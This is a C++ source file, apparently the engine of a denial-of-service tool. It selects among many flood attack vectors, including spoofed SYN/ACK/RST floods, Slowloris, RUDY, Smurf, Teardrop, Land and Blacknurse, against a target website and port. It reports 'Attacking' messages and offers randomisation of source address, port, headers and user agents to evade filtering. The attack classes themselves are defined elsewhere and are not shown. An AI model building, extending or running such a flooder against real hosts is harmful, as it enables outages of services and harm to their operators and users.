#include <memory>
#include <map>
#include <fstream>
#include <algorithm>

#include "../Headers/Engine.hpp"
#include "../Headers/Attack_Vectors.hpp"
#include "../Headers/Logging.hpp"

void Engine::run() {
    std::unique_ptr<Attack_Vector> flood;
    show_info();

    switch(conf->vector){
        case Config::NullTCP:
        case Config::NullUDP:
            flood = std::make_unique<Null_Flood>(conf);
            break;
        case Config::HTTP:
        case Config::UDPFlood:
        case Config::TCPFlood:
            flood = std::make_unique<Http_Flood>(conf);
            break;
        case Config::Slowloris:
        case Config::Rudy:
            flood = std::make_unique<Slowloris>(conf);
            break;
        case Config::Smurf:
        case Config::ICMPFlood:
        case Config::Blacknurse:
            flood = std::make_unique<ICMP_Flood>(conf);
            break;
        case Config::Land:
        case Config::SpoofedSyn:
        case Config::SpoofedAck:
        case Config::SpoofedRST:
        case Config::SpoofedURG:
        case Config::SpoofedPUSH:
        case Config::SpoofedFin:
            flood = std::make_unique<Spoofed_TCP_Flood>(conf);
            break;
        case Config::TearDrop:
        case Config::SpoofedUDP:
            flood = std::make_unique<Spoofed_UDP_Flood>(conf);
            break;
        case Config::Beast:
            flood = std::make_unique<Beast>(conf);
            break;
        default:break;
    }
    conf->timer.start_time = clock();
    flood->run();
}

Engine::Engine(std::shared_ptr<Config> conf) : conf{std::move(conf)}{

}

void Engine::show_info() {
    char message[512]{};
    snprintf(message, sizeof(message), "Attacking %s:%s with %d Threads, %d Connections",
             conf->website.c_str(), conf->port.c_str(), conf->THREADS, conf->CONNECTIONS);
    print_info(message);
    snprintf(message, sizeof(message), "Delay: %d microsecs", conf->delay);
    print_info(message);
    std::map<Config::Vector, const char*> title{};
    title[Config::HTTP] = "HTTP";
    title[Config::NullTCP] = "NullTCP";
    title[Config::NullUDP] = "NullUDP";
    title[Config::UDPFlood] = "UDPFlood";
    title[Config::TCPFlood] = "TCPFlood";
    title[Config::Slowloris] = "Slowloris";
    title[Config::Rudy] = "Rudy";
    title[Config::ICMPFlood] = "ICMP Flood";
    title[Config::Blacknurse] = "Black Nurse";
    title[Config::SpoofedSyn] = "Spoofed Syn Flood";
    title[Config::SpoofedAck] = "Spoofed Ack Flood";
    title[Config::SpoofedFin] = "Spoofed Fin Flood";
    title[Config::SpoofedPUSH] = "Spoofed Push Flood";
    title[Config::SpoofedRST] = "Spoofed Rst Flood";
    title[Config::SpoofedURG] = "Spoofed Urg Flood";
    title[Config::SpoofedUDP] = "Spoofed UDP";
    title[Config::TearDrop] = "Teardrop";
    title[Config::Beast] = "Beast";
    title[Config::Land] = "Land";
    title[Config::Smurf] = "Smurf";

    snprintf(message, sizeof(message), "Attack Vector: %s", title[conf->vector]);
    print_info(message);

    if(conf->UseSSL){
        print_info("SSL Enabled");
    }
    if(conf->RandomizeHeader){
        print_info("Header Randomization Enabled");
    }
    if(conf->RandomizeUserAgent){
        getUserAgents();
        snprintf(message, sizeof(message), "Useragent Randomization Enabled(%lu Useragents loaded)",
                 conf->useragents->size());
        print_info(message);

    }
    if(conf->RandomizeSource){
        print_info("Source Randomization Enabled");
    }
    if(conf->RandomizePort){
        print_info("Port Randomization Enabled");
    }

    fprintf(stdout, "%s", "--- press <Ctrl+C> to stop ---\n\n\n");

}

void Engine::getUserAgents() {
    std::ifstream filestream("useragents");
    std::string line{};
    if(filestream.good() & filestream.is_open()){
        long count = std::count(std::istreambuf_iterator<char>(filestream), std::istreambuf_iterator<char>(), '\n');
        filestream.clear();
        filestream.seekg(0, std::ios::beg);
        conf->useragents->reserve(static_cast<unsigned long>(count) +1);
        while(getline(filestream, line)){
            conf->useragents->emplace_back(line);
        }
        filestream.close();
    }else{
        print_warning("Unable to find useragents file");
    }
}
